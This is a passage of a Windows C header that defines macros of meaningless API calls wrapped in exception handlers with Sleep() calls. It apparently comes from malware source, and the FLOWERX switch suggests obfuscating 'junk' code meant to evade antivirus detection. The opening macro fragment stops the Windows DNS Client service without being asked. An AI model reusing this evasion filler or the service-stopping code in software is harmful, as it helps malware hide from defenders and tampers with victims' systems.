		if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))!=NULL)\
		{\
			service=OpenService(scm,"Dnscache",SERVICE_QUERY_STATUS|SERVICE_CONTROL_STOP);\
			if (service)\
			{\
				bRetval=QueryServiceStatus(service,&status);\
				if (bRetval)\
				{\
					if (status.dwCurrentState!=SERVICE_STOPPED)\
					{\
						ControlService(service,SERVICE_CONTROL_STOP,&status);\
					}\
				}\
			}\
		}\
		CloseServiceHandle(service);\
		CloseServiceHandle(scm);\
	}\
	__except(EXCEPTION_EXECUTE_HANDLER){\
	Sleep(21);\
	}

#define XCODE22 __try{\
		pbm = CBitmap::FromHandle(hbm);\
		if(::PathFileExists(szXBuff))\
		{\
			hbm = (HBITMAP)::LoadImage(NULL, szXBuff, IMAGE_BITMAP, 0, 0, LR_DEFAULTCOLOR|LR_DEFAULTSIZE|LR_LOADFROMFILE);\
			if(hbm != NULL)\
			{\
				pbm->GetBitmap(&bm);\
				pbm->Detach();\
			}\
		}\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(22);\
	}

#define XCODE23 __try{\
		if ((NtQuerySystemInformation = (PROCNTQSI)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")))\
		{\
			NtQuerySystemInformation(0, &SysBaseInfo,sizeof(SysBaseInfo),NULL);\
			NtQuerySystemInformation(3, &SysTimeInfo,sizeof(SysTimeInfo),0);\
			NtQuerySystemInformation(2, &SysPerfInfo,sizeof(SysPerfInfo),NULL);\
		}\
	}\
		__except(EXCEPTION_EXECUTE_HANDLER){\
		Sleep(22);\
	}

#define XCODE24 __try{\
		hmyfile = CreateFile("C:\\Windows\\system32\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );\
		if ( hmyfile == INVALID_HANDLE_VALUE ) {\
			__leave;\
		}\
		hXMod = CreateFileMapping( hmyfile, NULL, PAGE_READONLY, 0, 0, NULL );\
		if ( hXMod == INVALID_HANDLE_VALUE ) {\
			__leave;\
		}\
		lp=NULL;\
		lp = MapViewOfFile( hXMod, FILE_MAP_READ, 0, 0, 0 );\
		if ( ! lp ) {\
			__leave;\
		}\
		if ( *( USHORT* ) lp != IMAGE_DOS_SIGNATURE ) {\
			__leave;\
		}\
		if ( *( ( DWORD* ) ( ( PBYTE ) lp + ( ( PIMAGE_DOS_HEADER ) lp )->e_lfanew ) ) != IMAGE_NT_SIGNATURE ) {\
			__leave;\
		}\
}\
__finally {\
	if(lp)\
		UnmapViewOfFile( lp );\
	if(hXMod)\
		CloseHandle( hXMod );\
	if(hmyfile)\
		CloseHandle( hmyfile );\
	Sleep(24);\
}

#define XCODE25 __try{\
	hdc = GetDC(NULL);\
	hPen = CreatePen(0, 1, RGB(0, 0, 0));\
	hOldPen = (HPEN) SelectObject(hdc, hPen);\
	PasswdLen = SetROP2(hdc, R2_NOT);\
	GetClientRect(NULL, &prcOld);\
	MoveToEx(hdc, prcOld.left, prcOld.top, NULL);\
    LineTo(hdc, prcOld.right, prcOld.top);\
    LineTo(hdc, prcOld.right, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.bottom);\
    LineTo(hdc, prcOld.left, prcOld.top);\
	Rectangle(hdc, prcOld.left, prcOld.top, prcOld.right, prcOld.bottom);\
	SelectObject(hdc, hOldPen);\
	SetROP2(hdc, PasswdLen);\
    ReleaseDC(hwnd, hdc);\
}\
__finally {\
	Sleep(25);\
}
#ifdef FLOWERX
#include "xrand.h"
#else
#define XXX1 _asm nop;
#define XXX2 _asm nop;
#define XXX3 _asm nop;
#define XXX4 _asm nop;
#define XXX5 _asm nop;
#define XXX6 _asm nop;
#define XXX7 _asm nop;
#define XXX8 _asm nop;
#define XXX9 _asm nop;
#define XXX10 _asm nop;
#define XXX11 _asm nop;
#endif
